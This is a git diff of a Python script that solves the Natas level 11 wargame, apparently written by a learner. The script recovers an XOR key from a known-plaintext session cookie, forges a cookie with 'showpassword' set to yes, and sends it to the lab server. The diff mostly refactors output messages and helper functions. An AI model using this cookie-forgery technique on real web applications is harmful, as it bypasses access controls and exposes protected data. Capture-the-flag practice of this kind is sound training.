@@ -5,40 +5,48 @@ import binascii
 #----------------------------------------#
 # Don't follow along, itn't the solution #
 #----------------------------------------#
+
+
 userName = 'natas11'
 url = f'http://{userName}.natas.labs.overthewire.org/'
+
 
 fileContent = open("C:\\Users\\niroj\\Documents\\Natas\\password.txt")
 password = fileContent.readlines()[10][8:40]
 
+
 response = requests.get(url, auth = (userName, password))
 htmlDoc = response.text
+
 
 sessionCookies = requests.Session().get(url, auth=(userName, password))
 sessionCookies = sessionCookies.cookies.get_dict()
 
-print(sessionCookies)
+print('[*] session cookies: ',sessionCookies)
+
+try:
+    with open("C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html", 'w') as htmlContain:
+        htmlContain.writelines(htmlDoc)
+        print("(+) html documentation has been saved!")
+except IOError as e:
+    print(f"(-) Error {e} has appeared")
+
+
 
 response = requests.get(url + 'index-source.html', auth = (userName, password))
 htmlSource = response.text
 
 try:
-    with open("C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html", 'w') as htmlContain:
-        htmlContain.writelines(htmlDoc)
-        print("Operation Successfully accomplished!")
-except IOError as e:
-    print(f"Error {e} has appeared")
-
-try:
     with open("C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index-source.html", 'w') as htmlContain:
         htmlContain.writelines(htmlSource)
-        print("Source operation Successfully accomplished!")
+        print("(+) html php-source documentation has been saved!")
 except IOError as e:
-    print(f"Error {e} has appeared")
+    print(f"(-) Error {e} has appeared")
 
 # ---------------------------- Encryption & Decryption ----------------------------
 # Concept of XOR Operator
-# remember Xor is also represented as '^' sign (OK👌)
+# remember Xor is also represented as '^' sign 
+# (OK👌)
 # It work as: a ^ b = c
 # Interestingly: a ^ c = b
 # password ^ key = encryptedOne 
@@ -46,7 +54,7 @@ except IOError as e:
 
 cipherText = sessionCookies['data'].replace('%3D', '==')
 
-print(cipherText)
+print(f'(+) Cookies cipher text {cipherText} type {type(cipherText)}')
 
 
 def Unknown_2_Byte (unknownText):
@@ -57,10 +65,8 @@ def Unknown_2_Byte (unknownText):
     return decryptText
 
 
-
-
 cipher = Unknown_2_Byte(cipherText)
-print(cipher)
+print('(+) The xor cipher text is extracted successfully: ',cipher)
 
 # form the $defaultdata of php source 
 # defaultData = 'array( "showpassword"=>"no", "bgcolor"=>"#ffffff")'
@@ -82,12 +88,10 @@ def XOR_Operation(defaultData, cipher):
     key = key.decode()
     return key
 
-# print(f'cipher: {type(cipher)}\ndefaultData: {type(defaultData)}')
 defaultKey = XOR_Operation(defaultData, cipher)
-print(defaultKey)
+
 
 # we have the $key <cencored> but in repeated manner  
-# create a function to get the repeated substring
 
 def Repeated_Substring(key):
     match = re.search(r"(.+?)\1", key)
@@ -95,10 +99,10 @@ def Repeated_Substring(key):
     return key
     
 substring = Repeated_Substring(defaultKey)
-print(substring)
+print(f'(+) The KEY=>[ {substring} ] has been extracted successfully.')
 # Goodness, finally I have actual😮‍💨 key 
 
- # to match the sequence 
+
 defaultKey = defaultKey.encode()
 newDefaultData = b'{"showpassword":"no","bgcolor":"#ffffff"}'
 
@@ -114,26 +118,16 @@ def New_XOR_Operation(defaultData, cipher):
 
 
 newCipher = New_XOR_Operation(newDefaultData, defaultKey)
-print(newCipher)
+print(f'(+) The XOR Operation is performed successfully\n(+) The Encrypted cookie:  {newCipher} ')
 
-cookie = newCipher.encode()
-print(cookie)
-cookie = base64.b64encode(cookie).decode()
-print(cookie)
-cookie = cookie.replace('=','%3D')
-print(cookie)
-# newCipher = newCipher.encode('utf-8')
-# print(newCipher)
-# newCipher = newCipher.hex()
-# newCipher = newCipher.encode('utf-8')
-# newCipher = base64.b64encode(newCipher)
-# print(newCipher)
-# newCookie = base64.b64encode(newCipher)
-# hexEncodedText = newCookie.hex()
-# byteCode = hexEncodedText.encode('utf-8')
-# print(newCipher)
+def XOR_2_Cookie(inlet):
+    binaryForm = inlet.encode()
+    base64Form = base64.b64encode(binaryForm).decode()
+    cookieConversion = base64Form.replace('=','%3D')
+    return cookieConversion
 
-# Unknown_2_Byte(newCipher)
+cookie = XOR_2_Cookie(newCipher)
+print(f'\n(+) Cipher is converted into cookie: {cookie}')
 
 # ------------------------------ Done ----------------------------------
 
@@ -143,4 +137,4 @@ cookie = {
 
 response = requests.post(url, auth = (userName, password), cookies=cookie)
 htmlDoc = response.text
-print(htmlDoc)
+# print(htmlDoc)
